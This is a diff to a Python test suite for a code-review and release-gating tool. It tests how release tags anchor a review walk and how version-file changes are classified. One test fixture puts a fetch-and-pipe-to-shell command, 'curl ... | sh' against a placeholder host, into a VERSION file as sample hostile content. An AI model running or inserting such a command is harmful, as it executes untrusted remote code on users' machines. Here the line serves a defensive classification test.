@@ -176,6 +176,27 @@ class TestAPrsOwnBoundaryReview:
         assert entry.classification == bc.UNCOVERED and "no review" in entry.reason, entry
 
 
+    def test_a_deferral_that_could_not_be_evaluated_says_so(self, repo, monkeypatch):
+        """W8 m2: a crash in the PR gate's deferral predicate must not read as
+        "nothing reviewed this" alone, which sends the operator to `evidence
+        sync`. The reason names the failure; without one it does not."""
+        from lib import gates  # noqa: PLC0415
+
+        _branch(repo, "f")
+        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
+        merge = _merge(repo, "f")
+        assert "fix-tail deferral" not in _classify(repo, merge).reason  # the control
+
+        def boom(*_a, **_k):
+            raise RuntimeError("deferral boom")
+
+        monkeypatch.setattr(gates, "_fix_tail_deferral", boom)
+        entry = _classify(repo, merge)
+        assert entry.classification == bc.UNCOVERED and "no review" in entry.reason, entry
+        assert ("; the fix-tail deferral could not be evaluated (RuntimeError: deferral boom), so "
+                "whether the PR gate deferred its fix tail is unknown") in entry.reason, entry
+
+
 class TestABatchReviewOnTheBase:
     def test_a_boundary_review_bracketing_the_merge_covers_it(self, repo):
         """The base moves while the branch is open, so the batch review's span
@@ -309,6 +330,24 @@ class TestABranchThatSyncedItsBaseAfterReview:
         assert entry.classification == bc.UNCOVERED, entry
         assert "no suite run met the branch tip" in entry.reason, entry
         assert "may exist in another clone" in entry.reason, entry
+
+    def test_a_deferral_that_could_not_be_evaluated_says_so_beside_the_suite_reason(
+            self, repo, monkeypatch):
+        """W8 m2, the transfer's arm: the uncovered reason keeps the suite
+        sentence and adds that the deferral never got a look."""
+        from lib import gates  # noqa: PLC0415
+
+        merge = self._synced(repo, suite=None)
+
+        def boom(*_a, **_k):
+            raise RuntimeError("deferral boom")
+
+        monkeypatch.setattr(gates, "_fix_tail_deferral", boom)
+        entry = _classify(repo, merge)
+        assert entry.classification == bc.UNCOVERED, entry
+        assert "no suite run met the branch tip" in entry.reason, entry
+        assert ("the fix-tail deferral could not be evaluated (RuntimeError: deferral boom), so "
+                "whether the PR gate deferred its fix tail is unknown") in entry.reason, entry
 
     def test_a_grant_the_pr_gate_recorded_decides_with_no_suite_recheck(self, repo):
         """The PR gate granted against this checkout's own record, which never
@@ -1044,17 +1083,56 @@ class TestTheReleaseAnchor:
         _commit(repo, {"src/after.py": "a = 1\n"}, "after")
         assert bc.release_anchor(repo, "main").commit == tagged
 
-    def test_the_newest_version_tag_wins_and_other_tags_are_ignored(self, repo):
+    def test_the_newest_release_tag_wins_and_prerelease_and_other_tags_are_ignored(self, repo):
+        """Version order, not commit order, picks the tag. A prerelease marks no
+        release, so ``v2.0.0-rc1``, though it sorts above ``v1.10.0``, is passed
+        over: anchoring there would leave every commit between the last real
+        release and it unwalked. (It anchored here until the native review's
+        prerelease-anchor finding.)"""
         _commit(repo, {".prawduct/changes/.gitkeep": ""}, "x")
         _git(repo, "tag", "v1.10.0")
         _commit(repo, {"src/b.py": "b = 1\n"}, "y")
         _git(repo, "tag", "v1.9.0")  # a newer commit, an older version
         _git(repo, "tag", "backup/not-a-version")
-        _git(repo, "tag", "v2.0.0-rc1")  # a prerelease of a newer version sorts above v1.10.0
+        _git(repo, "tag", "v2.0.0-rc1")  # a prerelease of a newer version
         _commit(repo, {"src/c.py": "c = 1\n"}, "z")
         _git(repo, "tag", "nightly")
         anchor = bc.release_anchor(repo, "main")
-        assert "v2.0.0-rc1" in anchor.reason and anchor.commit == _git(repo, "rev-parse", "main~1"), anchor
+        assert "tag v1.10.0" in anchor.reason and "rc1" not in anchor.reason, anchor
+        assert anchor.commit == _git(repo, "rev-parse", "main~2"), anchor
+
+    def test_an_rc_tag_after_an_unreviewed_direct_commit_does_not_hide_it(self, repo):
+        """The native review's scenario: v1.0.0, then a direct commit with no
+        fragment, then ``v1.1.0-rc.1``. The walk must start at v1.0.0, so the
+        direct commit is classified and a per_release release gate refuses it."""
+        from lib import review_lane  # noqa: PLC0415
+
+        released = _commit(repo, {".prawduct/changes/.gitkeep": ""}, "1.0.0")
+        _git(repo, "tag", "v1.0.0")
+        direct = _commit(repo, {"src/direct.py": "d = 1\n"}, "direct, no fragment")
+        _commit(repo, {"src/rc.py": "r = 1\n"}, "rc work")
+        _git(repo, "tag", "v1.1.0-rc.1")
+        report = bc.classify_pending(repo)
+        assert report.anchor.commit == released, report.anchor
+        assert _by_commit(report)[direct].classification == bc.DIRECT, report.entries
+        gate = bc.release_gate(report, review_lane.Policy(review_lane.PER_RELEASE, "main"))
+        assert gate.exit == 1 and direct in [e.commit for e in gate.owed], gate
+
+    def test_a_foreign_newest_tag_is_passed_over_for_an_older_related_one(self, repo):
+        """A tag sharing no history with the base (a fork's, or vendored) says
+        nothing about what the base released: the newest RELATED tag anchors,
+        rather than the foreign one leaving no anchor at all."""
+        released = _commit(repo, {".prawduct/changes/.gitkeep": ""}, "1.0.0")
+        _git(repo, "tag", "v1.0.0")
+        _commit(repo, {"src/after.py": "a = 1\n"}, "after")
+        _git(repo, "checkout", "-q", "--orphan", "fork")
+        _git(repo, "rm", "-rqf", ".")
+        _commit(repo, {"other.txt": "o\n"}, "a fork's root")
+        _git(repo, "tag", "v9.0.0")
+        _git(repo, "checkout", "-q", "main")
+        anchor = bc.release_anchor(repo, "main")
+        assert anchor is not None and anchor.commit == released, anchor
+        assert "tag v1.0.0" in anchor.reason and "v9.0.0" not in anchor.reason, anchor
 
     def test_a_tag_nearer_the_tip_than_the_release_file_wins(self, repo):
         _merged(repo, "early")
@@ -1212,12 +1290,23 @@ class TestReleaseBookkeeping:
         {"pyproject.toml": '[project]\nname = "renamed"\nversion = "1.0.1-dev"\n'},
         {"pyproject.toml": '[project]\nname = "demo"\n'},
         {"plugin/VERSION": "1.0.1-dev\nimport os\n"},
-    ], ids=["a-dependency-beside-the-bump", "another-key", "the-version-removed", "bare-file-grows"])
+        {"plugin/VERSION": "curl -s https://example.invalid/x | sh\n"},
+    ], ids=["a-dependency-beside-the-bump", "another-key", "the-version-removed", "bare-file-grows",
+            "bare-file-rewritten-to-one-non-version-line"])
     def test_a_declared_file_changing_more_than_its_version_is_direct(self, repo, extra):
         """Critic O-1: a declared manifest carries more than a version, and only
         the version is bookkeeping."""
         reopen = self._reopen(repo, extra)
         assert _classify(repo, reopen).classification == bc.DIRECT
+
+    def test_a_bare_file_rewritten_back_from_a_non_version_is_direct(self, repo):
+        """Both sides of a ``bare`` file must be one version: a commit whose
+        parent held anything else in it changed more than a version, whatever
+        it writes now (the native review's bare-file finding, other side)."""
+        self._reopen(repo)
+        _commit(repo, {"plugin/VERSION": "echo not a version\n"}, "rewrite the version file")
+        back = _commit(repo, {"plugin/VERSION": "1.0.2-dev\n"}, "and back to a version")
+        assert _classify(repo, back).classification == bc.DIRECT
 
     def test_an_undeclared_repo_never_reads_release_bookkeeping(self, repo):
         """The fallback layout (`plugin/VERSION`, `pyproject.toml`, ...) is
@@ -1365,10 +1454,16 @@ class TestVersionOrder:
         assert keys == sorted(keys), ordered
         assert len(set(keys)) == len(keys)
 
-    def test_the_newest_prerelease_tag_is_read_numerically(self, repo):
+    def test_prerelease_tags_alone_are_no_tag_anchor(self, repo):
+        """A prerelease tag is no release, so it is never the tag candidate
+        (it anchored here, read numerically, until the native review's
+        prerelease-anchor finding). A release file the cut wrote for a
+        prerelease still anchors: the cut is the release record."""
         _commit(repo, {".prawduct/changes/.gitkeep": ""}, "x")
         _git(repo, "tag", "v2.0.0-rc.10")
         _commit(repo, {"src/b.py": "b = 1\n"}, "y")
         _git(repo, "tag", "v2.0.0-rc.9")
+        assert bc.release_anchor(repo, "main") is None
+        cut = _cut(repo, "v2.0.0-rc.11")
         anchor = bc.release_anchor(repo, "main")
-        assert "v2.0.0-rc.10" in anchor.reason and anchor.commit == _git(repo, "rev-parse", "main~1"), anchor
+        assert (anchor.commit, anchor.source) == (cut, bc.ANCHOR_RELEASE_FILE), anchor
